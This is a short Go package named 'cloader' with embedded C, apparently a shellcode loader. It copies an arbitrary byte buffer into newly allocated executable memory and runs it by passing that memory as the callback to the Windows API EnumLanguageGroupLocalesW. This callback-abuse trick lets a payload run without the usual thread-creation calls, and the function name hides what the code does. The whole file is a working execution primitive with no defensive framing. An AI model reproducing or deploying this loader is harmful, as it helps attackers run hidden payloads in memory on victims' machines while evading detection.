package cloader

/*
#include <windows.h>

void enumLanguageGroupLocalesW(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)addr, LGRPID_ARABIC, 0, 0);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumLanguageGroupLocalesW(p []byte) {
	C.enumLanguageGroupLocalesW((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
